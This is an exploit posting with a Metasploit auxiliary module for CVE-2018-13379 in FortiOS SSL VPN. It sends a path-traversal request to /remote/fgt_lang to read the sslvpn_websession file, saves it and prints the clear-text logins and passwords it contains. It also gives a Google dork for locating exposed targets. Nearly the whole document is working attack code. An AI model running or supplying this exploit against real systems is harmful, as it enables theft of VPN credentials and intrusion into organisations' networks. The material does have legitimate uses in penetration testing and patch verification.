# Exploit Title: Fortinet FortiOS Leak file - Reading login/passwords in clear text.
# Google Dork: intext:"Please Login" inurl:"/remote/login"
# Date: 17/08/2019
# Exploit Author: Carlos E. Vieira
# Vendor Homepage: https://www.fortinet.com/
# Software Link: https://www.fortinet.com/products/fortigate/fortios.html
# Version: This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
# Tested on: 5.6.6
# CVE : CVE-2018-13379

require 'msf/core'
class MetasploitModule < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Post::File
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SSL VPN FortiOs - System file leak',
			'Description'    => %q{
				FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests.
				This exploit read /dev/cmdb/sslvpn_websession file, this file contains login and passwords in (clear/text).
				This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
			},
			'References'     =>
			    [
			        [ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379' ]
			    ],
			'Author'         => [ 'lynx (Carlos Vieira)' ],
			'License'        => MSF_LICENSE,
			 'DefaultOptions' =>
		      {
		        'RPORT' => 443,
		        'SSL' => true
		      },
			))

	end


	def run()
		print_good("Checking target...")
		res = send_request_raw({'uri'=>'/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'})

		if res && res.code == 200
			print_good("Target is Vulnerable!")
			data = res.body
			current_host = datastore['RHOST']
			filename = "msf_sslwebsession_"+current_host+".bin"
			File.delete(filename) if File.exist?(filename)
			file_local_write(filename, data)
			print_good("Parsing binary file.......")
			parse()
		else
			if(res && res.code == 404)
				print_error("Target not Vulnerable")
			else
				print_error("Ow crap, try again...")
			end
		end
	end
	def parse()
		current_host = datastore['RHOST']

	    fileObj = File.new("msf_sslwebsession_"+current_host+".bin", "r")
	    words = 0
	    while (line = fileObj.gets)
	    	printable_data = line.gsub(/[^[:print:]]/, '.')
	    	array_data = printable_data.scan(/.{1,60}/m)
	    	for ar in array_data
	    		if ar != "............................................................"
	    			print_good(ar)
	    		end
	    	end
	    	#print_good(printable_data)

		end
		fileObj.close
	end
end